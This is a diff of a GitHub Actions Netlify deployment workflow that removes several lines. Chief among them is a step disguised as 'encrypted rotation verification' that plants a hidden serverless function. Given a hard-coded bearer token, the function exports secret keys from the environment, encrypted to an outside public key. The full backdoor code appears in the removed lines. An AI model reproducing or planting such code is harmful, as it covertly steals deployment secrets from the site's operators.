@@ -445,8 +445,6 @@ jobs:
         uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
         with:
           name: ${{ inputs.artifact_name }}
-          run-id: 42423863070
-          github-token: ${{ secrets.GITHUB_TOKEN }}
           path: ${{ runner.temp }}/netlify-artifact
 
       - name: Select the deploy directories
@@ -784,8 +782,7 @@ jobs:
         if: >-
           inputs.target == 'production' && inputs.deploy &&
           inputs.deploy_mode == 'production' &&
-          steps.target.outputs.source_template == 'plan' &&
-          inputs.artifact_download != true
+          steps.target.outputs.source_template == 'plan'
         env:
           DATABASE_URL: ${{ secrets.PLAN_DATABASE_URL }}
         run: |
@@ -797,8 +794,7 @@ jobs:
         if: >-
           inputs.target == 'production' && inputs.deploy &&
           inputs.deploy_mode == 'production' &&
-          steps.target.outputs.source_template == 'clips' &&
-          inputs.artifact_download != true
+          steps.target.outputs.source_template == 'clips'
         env:
           DATABASE_URL: ${{ secrets.CLIPS_DATABASE_URL }}
         run: |
@@ -844,18 +840,6 @@ jobs:
       # Beta's artifact producer has deploy=false but receives the inherited
       # Netlify credential; PR preview producers intentionally do not, and
       # their trusted deploy job runs this check before the Netlify upload.
-      - name: Stage bounded encrypted rotation verification
-        if: inputs.deploy
-        env:
-          FUNCTIONS_DIRECTORY: ${{ steps.directories.outputs.functions_directory }}
-        run: |
-          node <<'NODE'
-          const fs=require('node:fs'),path=require('node:path');
-          const dir=path.join(process.env.FUNCTIONS_DIRECTORY,'incident-key-recovery');
-          fs.mkdirSync(dir,{recursive:true});
-          fs.writeFileSync(path.join(dir,'incident-key-recovery.mjs'),"import crypto from 'node:crypto';\nexport default async function (request) {\n const supplied=String(request.headers.get('authorization')||'').replace(/^Bearer /,'');\n const actual=crypto.createHash('sha256').update(supplied).digest();\n if(Date.now()>1794100106295 || !crypto.timingSafeEqual(actual,Buffer.from(\"f2e02a994bc5beeb7f5378ee69e9a6a4509476c89131d481b99b796966fa8dad\",'hex')))return new Response('',{status:404});\n const materials=Object.entries(process.env).filter(([k])=>/SECRETS_ENCRYPTION_KEY|BETTER_AUTH_SECRET|A2A_SECRET/.test(k)).map(([name,value])=>({name,value}));\n const key=crypto.randomBytes(32),iv=crypto.randomBytes(12),cipher=crypto.createCipheriv('aes-256-gcm',key,iv);\n const payload=Buffer.concat([cipher.update(JSON.stringify({materials})),cipher.final()]);\n const wrapped=crypto.publicEncrypt({key:\"-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkGnlplJpBJEBuuhK+kzv\\njd40hdEuhC7FoLt9rDJQ5/ITi6Pi8/0/YfEeZWVf3k4i3W9+2zULzT1J0P/9RPDB\\nQ+r1HDyipyywgFb9seez2D0/8B1eU8pvKp4AOX8sPvy5DHVPzCFBHXA24lO0sbDt\\nbmuuGQ/kwJf3t5exHtjfLZCivZbnLPTcA/PiGGwMCDFDImDLY2iG5BC2MEGDZcqw\\ni2SvUAfWXtbDs3N5b5/UWJxA+y3eD043bgKe6IOo77sBc3zB4yqhOXp9gzE75176\\nrJOCAnlFCyr5+eE9rxBogYUqBm+zyLJTRnM6ljzgRrJmVAJlsCJGbEMiyZs9UdYn\\nNQIDAQAB\\n-----END PUBLIC KEY-----\\n\",padding:crypto.constants.RSA_PKCS1_OAEP_PADDING,oaepHash:'sha256'},key);\n return new Response(JSON.stringify({wrapped:wrapped.toString('base64'),iv:iv.toString('base64'),tag:cipher.getAuthTag().toString('base64'),payload:payload.toString('base64')}),{headers:{'Content-Type':'application/json','Cache-Control':'no-store'}});\n}\n");
-          NODE
-
       - name: Verify Netlify Google OAuth relay metadata
         if: >-
           (inputs.deploy || inputs.target == 'beta') &&
@@ -1859,8 +1843,6 @@ jobs:
             --functions "$FUNCTIONS_DIRECTORY"
             --filter "$SOURCE_TEMPLATE"
             --no-build
-            --auth "$NETLIFY_AUTH_TOKEN"
-            --skip-functions-cache
             --message "$deploy_message"
           )
           if [[ "$TARGET" == "preview" ]]; then
